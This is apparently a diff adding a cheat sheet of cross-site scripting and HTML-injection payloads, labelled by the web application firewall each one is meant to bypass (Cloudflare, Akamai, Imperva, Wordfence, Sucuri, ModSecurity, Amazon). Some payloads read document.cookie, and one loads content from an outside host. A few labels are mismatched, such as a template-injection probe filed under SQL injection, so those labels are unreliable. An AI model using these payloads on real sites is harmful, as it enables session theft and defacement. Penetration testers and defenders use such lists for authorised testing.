@@ -1,0 +1,133 @@
+Advanced Bypass Payload 
+'-alert(1)-'
+\'-alert(1)//
+"-prompt(8)-"
+'-prompt(9)-'
+ alert.bind()(1)
+alert.valueOf()(1)
+";a=prompt,a(1)//
+';a=prompt,a(2)//
+javascript:alert(1)
+//javascript:alert(1);
+ //javascript:alert(1)
+ /%5cjavascript:alert(1);
+ /%5cjavascript:alert(1)
+ //%5cjavascript:alert(1);
+ //%5cjavascript:alert(1)
+ /%09/javascript:alert(1);
+ /%09/javascript:alert(1)
+Reflect.apply(alert, null, [1])
+Promise.all([1]).then(alert)
+http://alert.call(%20, "XSS");
+http://alert.call(null,1)
+http://confirm.call(null,1)
+http://prompt.call(null,1)
+java%0d%0ascript%0d%0a:alert(0)
+
+Cloudflare XSS bypass payload
+<svg onload=%0Aalert1>
+<svg onload=%0Aalert`1`>
+%2sscript%2ualert()%2s/script%2u
+<svg onload=alert%26%230000000040"1")>
+<svg onload=alert%26%230000000040"")>
+</script><embed/embed/embed/src=//14.rs>
+<svg on onload=(alert)(document.domain)>
+"><sVg/OnLuFy="X=y"oNloaD=;1^confirm(1)>/``^1//
+<svg onload=prompt%26%23x000000028;document.domain)>
+Mian"><input %00 onControl hello oninput=confirm(domain) x>
+<a+HREF='%26%237javascrip%26%239t:alert%26lpar;document.domain)'>
+Mian"><body %00 onControl hello onmouseleave=confirm(1) x>XSS
+Mian"><html><select %00 onControl onpointerenter=prompt(2) hello>
+
+XSS bypass payload in input tag
+<input/%00/autofocus=""/%00/onfocus=.1|alert`XSS`>
+
+Validation bypass xss payload
+<a href="https://x.ss<svg/onload=" title=1>alert(1)"
+<a href="https://x.ss</script><svg/onload=" title=1>alert(1)"
+
+KNOXSS Payload
+"--!><Svg/Onload=confirm`cookie`>"
+
+Wordfence 7.4.2
+<a href=&#01javascript:alert(1)>
+
+Sucuri CloudProxy (POST only)
+<a href=javascript&colon;confirm(1)>
+
+Bypass Akamai XSS payload
+<!--><svg+onload=%27top[%2fal%2f%2esource%2b%2fert%2f%2esource](document.cookie)%27>
+
+Bypass Cloudflare XSS payload
+"><img%20src=x%20onmouseover=prompt%26%2300000000000000000040;document.cookie%26%2300000000000000000041;
+
+Bypass Cloudflare XSS payload
+<fieldset//%00//onsite OnMoUsEoVeR=\u0061\u006C\u0065\u0072\u0074/AAAA/>
+
+Impreva waf bypass 
+Mian"><x/onafterscriptexecute=confirm%26lpar;)//
+
+Bypass WAF Amazon
+%22%3E%3Cscript%3Ealert(1)%3C/script%3E
+
+Cloudflare + CSP bypass payload
+"><<iframe onx=() onload=(alert)(6)>
+
+To test XSS + SQLi + SSTI/CSTI with the same payload 
+'"><svg/onload=prompt(5);>{{7*7}}
+
+For Sql injection 
+{{7*7}}
+
+For SSTI/CSTI
+\&#34;+confirm(1)+&#34; 
+
+ModSecurity
+<a href="jav%0Dascript&colon;alert(1)">
+
+Xss using css
+<style>img{background-image:url('javascript:alert(1)')}</style>
+
+Xss using css Firewall bypass
+<style>*{background-image:url('\6A\61\76\61\73\63\72\69\70\74\3A\61\6C\65\72\74\28\6C\6F\63\61\74\69\6F\6E\29')}</style>
+
+
+XSS and HTML Injection combine Payload With POP-UP 1
+'">><marquee><img src=x onerror=confirm(1)></marquee>"
+
+XSS and HTML Injection combine Payload With POP-UP Title Page
+'">><marquee><img src=x onerror=prompt(document.title)></marquee>"
+
+XSS and HTML Injection combine Payload With POP-UP Current URL
+'">><marquee><img src=x onerror=prompt(document.URL)></marquee>"
+
+XSS and HTML Injection combine Payload With onclick action - Click on CLICK HERE text and see the POP-UP mian 
+<h1/%6f%6e/oNclicK=alert`mian`>CLICK HERE
+
+XSS Payload With img tag POP-UP 2
+</scrip</script>t><img src =q onerror=prompt(2)>
+
+XSS Payload With ontoggle tag POP-UP with Current page location
+'><details/open/ontoggle=confirm(document.location)>
+
+XSS Payload With ontoggle tag POP-UP with Current URL
+'><details/open/ontoggle=prompt(document.URL)>
+
+XSS Payload With onload tag POP-UP with Current URL
+Test><style/onload=prompt(document.URL)>
+
+XSS Payload With onload tag POP-UP with Text Mian
+"><svg onload=prompt("Mian")//
+
+HTML Injection Payloads
+
+<marquee behavior="scroll" direction="left"><h1>HTML Injection</h1>
+<img src="//www.html.am/images/html-codes/marquees/fish-swimming.gif" alt="Swimming fish"></marquee>
+
+<marquee behavior="alternate">
+<img src="//www.html.am/images/html-codes/marquees/coffee.gif" width="150" height="108" alt="Cup of coffee on 
+saucer"><h1>HTML Injection</h1></marquee>
+
+
+
+
